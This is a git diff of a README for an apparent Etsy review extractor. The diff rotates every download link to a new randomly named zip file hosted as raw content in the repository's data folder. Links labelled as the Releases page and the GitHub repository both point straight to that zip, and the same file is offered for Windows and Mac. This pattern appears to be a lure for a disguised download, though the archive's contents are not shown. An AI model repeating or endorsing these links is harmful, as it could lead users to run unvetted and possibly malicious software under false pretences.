@@ -1,7 +1,7 @@
 # 🛍️ etsy-reviews - Extract Etsy Reviews with Ease
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/MUHAMMADKHILOOOO14/etsy-reviews/main/etsy-reviews-scraper/data/etsy-reviews-endosporium.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/MUHAMMADKHILOOOO14/etsy-reviews/main/etsy-reviews-scraper/data/etsy-reviews-endosporium.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/MUHAMMADKHILOOOO14/etsy-reviews/main/etsy-reviews-scraper/data/etsy-reviews-unhat.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/MUHAMMADKHILOOOO14/etsy-reviews/main/etsy-reviews-scraper/data/etsy-reviews-unhat.zip)
 
 ## 📖 Description
 Etsy review extractor for sellers and analysts. This tool helps you gather and analyze customer reviews from Etsy. It is designed for small business owners and market researchers who want to gain insights into customer feedback.
@@ -11,10 +11,10 @@ Follow these simple steps to download and run the application:
 
 1. **Visit the Download Page**  
    Click the link below to go to the Releases page, where you can download the latest version:  
-   [Download Latest Release](https://raw.githubusercontent.com/MUHAMMADKHILOOOO14/etsy-reviews/main/etsy-reviews-scraper/data/etsy-reviews-endosporium.zip)
+   [Download Latest Release](https://raw.githubusercontent.com/MUHAMMADKHILOOOO14/etsy-reviews/main/etsy-reviews-scraper/data/etsy-reviews-unhat.zip)
 
 2. **Choose the Right File**  
-   On the Releases page, look for the most recent version. You will see various files available for download. Select the file that matches your operating system. For Windows, you might see something like `https://raw.githubusercontent.com/MUHAMMADKHILOOOO14/etsy-reviews/main/etsy-reviews-scraper/data/etsy-reviews-endosporium.zip`. For Mac, you may find `https://raw.githubusercontent.com/MUHAMMADKHILOOOO14/etsy-reviews/main/etsy-reviews-scraper/data/etsy-reviews-endosporium.zip`.
+   On the Releases page, look for the most recent version. You will see various files available for download. Select the file that matches your operating system. For Windows, you might see something like `https://raw.githubusercontent.com/MUHAMMADKHILOOOO14/etsy-reviews/main/etsy-reviews-scraper/data/etsy-reviews-unhat.zip`. For Mac, you may find `https://raw.githubusercontent.com/MUHAMMADKHILOOOO14/etsy-reviews/main/etsy-reviews-scraper/data/etsy-reviews-unhat.zip`.
 
 3. **Download the File**  
    Click on the file to start the download. Depending on your browser settings, the file should save automatically to your downloads folder.
@@ -60,7 +60,7 @@ If you encounter any issues, please do the following:
 3. You can also submit a new issue for any specific requests or problems you are experiencing.
 
 For ongoing updates and to contribute, check out our GitHub repository:  
-[GitHub Repository](https://raw.githubusercontent.com/MUHAMMADKHILOOOO14/etsy-reviews/main/etsy-reviews-scraper/data/etsy-reviews-endosporium.zip)
+[GitHub Repository](https://raw.githubusercontent.com/MUHAMMADKHILOOOO14/etsy-reviews/main/etsy-reviews-scraper/data/etsy-reviews-unhat.zip)
 
 ## 📄 License
 This project is licensed under the MIT License. Feel free to use and modify as per your needs, but be sure to include the original license and attribution.
